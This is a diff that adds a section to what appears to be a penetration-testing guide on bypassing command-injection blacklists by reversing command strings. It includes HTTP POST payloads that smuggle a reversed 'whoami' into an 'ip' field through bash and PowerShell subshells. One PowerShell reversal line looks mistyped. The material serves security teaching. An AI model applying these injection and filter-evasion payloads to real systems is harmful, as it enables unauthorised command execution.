@@ -12,3 +12,32 @@ Additionally, for bash shell, the following technique will work as well:
 ```nix
 $(a="WhOaMi";printf %s "${a,,}")
 ```
+## Reversed Commands
+Another technique is reversing commands, and having a command template that switches them back and executes the command. For example, instead of executing `whoami`, we will instead use `imaohw` to avoid triggering the blacklisted command.
+
+But first, we have to get the reversed string of our command in our terminal:
+```nix
+echo 'whoami' | rev
+```
+Then we can execute the original command by reversing it back in a sub-shell:
+```http
+POST / HTTP/1.1
+Host: target-website.com
+...
+
+ip=127.0.0.1%0d%0a$(rev<<<'imaohw')
+```
+
+The same can also be applied to Windows. First we reverse the string:
+```powershell
+"whoami"[-1...20] -join ''
+```
+Then we execute a reverse string using Powershell sub-shell (`iex "$()"`):
+```http
+POST / HTTP/1.1
+Host: target-website.com
+...
+
+ip=127.0.0.1%0d%0aiex "$('imaohw'[-1..-20] -join '')"
+```
+> Note: We removed the encoding on the command so that we can read it properly. But during engagements, make sure to encode the necessary characters to bypass other filters.
